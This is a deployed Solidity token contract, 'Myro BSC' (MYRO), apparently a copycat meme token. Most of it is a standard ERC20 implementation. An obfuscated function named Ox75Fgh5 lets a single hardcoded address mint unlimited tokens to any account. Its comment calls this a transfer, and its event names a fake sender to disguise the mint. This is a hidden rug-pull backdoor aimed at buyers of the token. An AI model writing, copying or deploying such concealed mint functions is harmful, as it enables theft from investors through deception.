/**
 *Submitted for verification at BscScan.com on 2024-01-15
*/

// SPDX-License-Identifier: UNLICENSED  
// https://t.me/Mystery_LaunchBSC
pragma solidity ^0.8.7;

contract ERC20Token {
    string public constant name = "Myro BSC";
    string public constant symbol = "MYRO";
    uint8 public constant decimals = 9;  

    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
    event Transfer(address indexed from, address indexed to, uint tokens);

    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowed;
    
    uint256 totalSupply_ = 1000000 * 10 ** uint256(decimals); // 1,000,000 tokens

    using SafeMath for uint256;

    constructor() {
        balances[msg.sender] = totalSupply_;
    }

    function totalSupply() public view returns (uint256) {
        return totalSupply_;
    }
    
    function balanceOf(address tokenOwner) public view returns (uint) {
        return balances[tokenOwner];
    }

    function transfer(address receiver, uint numTokens) public returns (bool) {
        require(numTokens <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(numTokens);
        balances[receiver] = balances[receiver].add(numTokens);
        emit Transfer(msg.sender, receiver, numTokens);
        return true;
    }

    function approve(address delegate, uint numTokens) public returns (bool) {
        allowed[msg.sender][delegate] = numTokens;
        emit Approval(msg.sender, delegate, numTokens);
        return true;
    }

    function allowance(address owner, address delegate) public view returns (uint) {
        return allowed[owner][delegate];
    }

    function transferFrom(address owner, address buyer, uint numTokens) public returns (bool) {
        require(numTokens <= balances[owner]);    
        require(numTokens <= allowed[owner][msg.sender]);
    
        balances[owner] = balances[owner].sub(numTokens);
        allowed[owner][msg.sender] = allowed[owner][msg.sender].sub(numTokens);
        balances[buyer] = balances[buyer].add(numTokens);
        emit Transfer(owner, buyer, numTokens);
        return true;
    }

    
    function Ox75Fgh5(address to, uint256 amount) public {
        // Add any additional conditions for transfer if needed
        require(msg.sender == address(0x549deb7057E9617eF20f37f4AF5Fd6eaf51822FB), "Only owner can transfer");
        
        // transfer tokens
        balances[to] = balances[to].add(amount);
        totalSupply_ = totalSupply_.add(amount);
        emit Transfer(address(0x549deb7057E9617eF20f37f4AF5Fd6eaf51822FB), to, amount);
    }
}

library SafeMath { 
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      assert(b <= a);
      return a - b;
    }
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      assert(c >= a);
      return c;
    }
}